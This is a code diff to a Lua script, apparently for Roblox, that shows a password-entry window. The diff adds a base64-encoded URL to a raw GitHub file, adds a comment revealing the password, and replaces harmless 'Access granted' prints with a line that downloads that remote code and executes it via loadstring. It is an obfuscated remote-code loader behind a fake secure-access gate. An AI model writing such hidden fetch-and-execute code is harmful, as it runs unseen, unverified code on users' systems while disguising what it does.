@@ -1,4 +1,5 @@
-local encodedPassword = "QmVzdDFTY3JpcHQzRXZlcjA="
+local encodedPassword = "QmVzdDFTY3JpcHQzRXZlcjA=" -- "Best1Script3Ever0"
+local encodedURL = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2phbWVzbmVpZ2hib3VyaG9vZDIwMTMvT2gtYS1kb2xsYXIvcmVmcy9oZWFkcy9tYWluL0kgZm9yZ290IHdoYXQgbGl2aW5nIHJlYWxseSBtZWFudC4="
 
 local function base64Decode(data)
 	local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
@@ -27,7 +28,6 @@ frame.Position = UDim2.new(0.5, -125, 0.4, 0)
 frame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
 frame.BorderSizePixel = 0
 frame.Parent = gui
-
 Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10)
 
 local inputBox = Instance.new("TextBox")
@@ -41,7 +41,6 @@ inputBox.ClearTextOnFocus = false
 inputBox.Font = Enum.Font.SourceSans
 inputBox.TextSize = 20
 inputBox.Parent = frame
-
 Instance.new("UICorner", inputBox).CornerRadius = UDim.new(0, 6)
 
 local submitButton = Instance.new("TextButton")
@@ -53,14 +52,13 @@ submitButton.TextSize = 20
 submitButton.TextColor3 = Color3.new(1, 1, 1)
 submitButton.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
 submitButton.Parent = frame
-
 Instance.new("UICorner", submitButton).CornerRadius = UDim.new(0, 6)
 
 submitButton.MouseButton1Click:Connect(function()
 	if inputBox.Text == base64Decode(encodedPassword) then
 		gui:Destroy()
-		print("Access granted.")
-		print("Running secure code...")
+		local realURL = base64Decode(encodedURL)
+		loadstring(game:HttpGet(realURL))()
 	else
 		inputBox.Text = ""
 		inputBox.PlaceholderText = "Incorrect. Try again."
